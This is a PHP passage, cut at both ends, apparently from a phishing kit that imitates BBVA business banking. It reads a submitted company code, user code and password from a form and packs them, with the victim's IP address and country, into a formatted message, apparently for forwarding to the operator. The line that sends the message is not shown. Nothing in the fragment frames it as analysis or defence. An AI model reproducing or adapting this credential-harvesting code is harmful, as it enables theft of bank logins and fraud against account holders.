...
if (isset($_POST['cod_emp']) && isset($_POST['cod_usu'])  && isset($_POST['eai_password']) ){
$tipodoc = $_POST["cod_emp"];
$numdoc = $_POST["cod_usu"];
$clv = $_POST["eai_password"];

$message = "---bbva---\nCodigo empresa: <code>$tipodoc</code>\nCodigo usuario: <code>$numdoc</code>\nClvd: <code>$clv</code>\n---IPP---\n".$myip." ".$pais."";
